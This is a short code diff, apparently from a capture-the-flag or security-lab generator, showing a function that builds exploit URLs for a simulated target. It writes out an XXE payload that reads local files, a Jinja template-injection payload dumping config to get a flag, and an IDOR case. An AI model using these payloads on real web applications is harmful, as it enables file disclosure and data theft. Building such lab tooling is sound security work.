@@ -222,7 +222,8 @@ def _exploit_url(kind: str, graph: WorldGraph, base: str) -> str:
         xml = f'<!DOCTYPE x [<!ENTITY e SYSTEM "file://{path}">]><x>&e;</x>'
         return f"{base}{ep}?{params['target_param']}={urllib.parse.quote(xml)}"
     if kind == "ssti":
-        expr = '{{ read("' + _flag_record_key(graph) + '") }}'
+        # Real Jinja: dump the injected config that holds the file store.
+        expr = "{{ config[" + repr(_flag_record_key(graph)) + "] }}"
         return f"{base}{ep}?{params['target_param']}={urllib.parse.quote(expr)}"
     if kind == "idor":
         rid = _flag_record_key(graph)
